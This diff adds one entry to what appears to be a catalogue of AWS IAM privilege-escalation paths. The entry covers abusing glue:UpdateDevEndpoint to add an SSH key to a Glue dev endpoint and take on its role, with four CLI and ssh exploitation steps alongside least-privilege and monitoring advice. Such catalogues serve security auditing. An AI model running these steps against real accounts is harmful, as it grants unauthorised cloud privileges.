@@ -1,0 +1,65 @@
+id: glue-002
+name: glue:UpdateDevEndpoint
+category: access-resource
+services:
+- glue
+description: A principal with `glue:UpdateDevEndpoint` can update an existing Glue development endpoint to add their SSH public
+  key, granting them SSH access to the endpoint. Since the endpoint executes with the permissions of its attached IAM role,
+  the attacker gains the privileges of that role. This path doesn't require `iam:PassRole` as the role is already attached.
+prerequisites:
+  admin:
+  - A Glue development endpoint must already exist
+  - The endpoint's attached role must have administrative permissions
+  lateral:
+  - A Glue development endpoint must already exist
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws glue get-dev-endpoints
+    description: List existing Glue development endpoints and their attached roles
+  - step: 2
+    command: |
+      aws glue update-dev-endpoint --endpoint-name TARGET_ENDPOINT \
+        --add-public-keys "$(cat ~/.ssh/id_rsa.pub)"
+    description: Add your SSH public key to an existing privileged dev endpoint
+  - step: 3
+    command: aws glue get-dev-endpoint --endpoint-name TARGET_ENDPOINT
+    description: Retrieve the endpoint address
+  - step: 4
+    command: ssh glue@ENDPOINT_ADDRESS
+    description: SSH into the dev endpoint and execute code with the endpoint's role permissions
+recommendation: |
+  Restrict access to `glue:UpdateDevEndpoint` using the principle of least privilege.
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "glue:UpdateDevEndpoint",
+    "Resource": "arn:aws:glue:REGION:ACCOUNT_ID:devEndpoint/SpecificEndpoint"
+  }
+  ```
+
+  Additional controls:
+  - Monitor CloudTrail for UpdateDevEndpoint API calls
+  - Alert on public key additions to dev endpoints
+  - Regularly audit dev endpoint SSH keys
+  - Implement automated remediation for unauthorized key additions
+  - Consider using session-based access instead of SSH keys
+discoveredBy:
+  name: Bishop Fox
+  organization: Bishop Fox
+references:
+- title: 'Well, That Escalated Quickly: How Abusing AWS API Can Lead to Admin Access'
+  url: https://know.bishopfox.com/research/privilege-escalation-in-aws
+- title: IAM Vulnerable - Glue UpdateDevEndpoint
+  url: https://github.com/BishopFox/iam-vulnerable
+relatedPaths:
+- glue-001
+- ssm-001
+- ec2-002
+toolSupport:
+  iamVulnerable: true
+permissions:
+  required:
+  - permission: glue:UpdateDevEndpoint
+    resourceConstraints: Target dev endpoint must be in the Resource section
